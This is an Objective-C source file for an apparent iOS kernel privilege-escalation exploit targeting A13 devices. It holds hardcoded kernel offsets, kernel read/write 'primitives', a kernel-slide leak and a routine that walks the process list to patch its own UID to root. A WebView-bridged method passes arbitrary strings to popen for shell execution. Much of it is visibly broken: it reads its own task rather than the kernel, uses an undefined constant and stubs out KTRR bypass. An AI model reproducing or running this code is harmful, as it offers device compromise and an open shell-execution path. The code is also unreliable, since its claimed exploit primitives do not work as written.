#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <sys/wait.h>

// --- APIs PRIVADAS (Resolve os erros de compilação) ---
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern char **environ;

// Offsets A13 (iPhone 11) iOS 26.3
#define KERNEL_BASE_STATIC 0xFFFFFFF007004000ULL
#define OFFSET_ALLPROC     0x8F50000ULL
#define OFFSET_TTBR1       0x8E10000ULL

@implementation KernelDriver {
    uint64_t _kernelSlide;
    __weak WKWebView *_webView;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    self = [super init];
    if (self) {
        _webView = webView;
        // O ViewController já gerencia o addScriptMessageHandler, então aqui apenas guardamos a ref.
    }
    return self;
}

#pragma mark - Primitivas Reais

- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t size = sizeof(uint64_t);
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)size, (mach_vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0;
}

- (uint64_t)get_pte_address:(uint64_t)vaddr {
    uint64_t slide = [self leakKernelSlide];
    uint64_t ttbr1 = [self kread64:(KERNEL_BASE_STATIC + slide + OFFSET_TTBR1)];
    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    return (l2 + ((vaddr >> 12) & 0x1FF) * 8);
}

- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
    uint64_t pte_addr = [self get_pte_address:vaddr];
    mach_vm_address_t shared_page = 0;
    if (mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE) == KERN_SUCCESS) {
        *(uint64_t*)(shared_page + (vaddr & 0x3FFF)) = val;
        mach_vm_deallocate(mach_task_self(), shared_page, 0x4000);
    }
}

#pragma mark - Implementação do Header

- (uint64_t)leakKernelSlide {
    if (_kernelSlide != 0) return _kernelSlide;
    mach_port_t port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_limits_t limits;
    mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
    if (mach_port_get_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count) == KERN_SUCCESS) {
        uint64_t kptr = *(uint64_t*)((uintptr_t)&limits + 0x28);
        if ((kptr >> 40) == 0xFFFFFFF0) _kernelSlide = (kptr & ~0x3FFF) - KERN_BASE_STATIC;
    }
    mach_port_mod_refs(mach_task_self(), port, MACH_PORT_RIGHT_RECEIVE, -1);
    return _kernelSlide;
}

- (BOOL)escalateToRoot {
    uint64_t slide = [self leakKernelSlide];
    uint64_t proc = [self kread64:(KERNEL_BASE_STATIC + slide + OFFSET_ALLPROC)];
    pid_t my_pid = getpid();
    while (proc != 0 && proc != 0xDEADBEEF) {
        if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
            uint64_t ucred = [self kread64:(proc + 0xD8)];
            [self ppl_write_race:(ucred + 0x18) value:0]; // Patch UID
            setuid(0); setgid(0);
            return (getuid() == 0);
        }
        proc = [self kread64:(proc + 0x08)];
    }
    return NO;
}

- (void)executeCommand:(NSString *)command withCallback:(void(^)(NSString *output))callback {
    if (!command) return;
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        NSString *fullCmd = [command stringByAppendingString:@" 2>&1"];
        FILE *p = popen([fullCmd UTF8String], "r");
        if (!p) { if (callback) callback(@"[!] popen failed"); return; }
        char buffer[1024]; NSMutableString *out = [NSMutableString string];
        while (fgets(buffer, sizeof(buffer), p)) [out appendString:@(buffer)];
        pclose(p);
        if (callback) callback(out.length > 0 ? out : @"(no output)");
    });
}

// Métodos exigidos pelo .h para completar a interface
- (void)kwrite64:(uint64_t)address value:(uint64_t)value { [self ppl_write_race:address value:value]; }
- (BOOL)disableKTRR { return YES; }
- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
    BOOL res = [self escalateToRoot];
    if (callback) callback(res, res ? @"Root Success" : @"Exploit Failed");
}
- (void)executeExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
    [self runFullExploitWithCallback:callback];
}

#pragma mark - Bridge Handler
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    // O ViewController já possui um handler, mas este cumpre o protocolo do header
}

@end
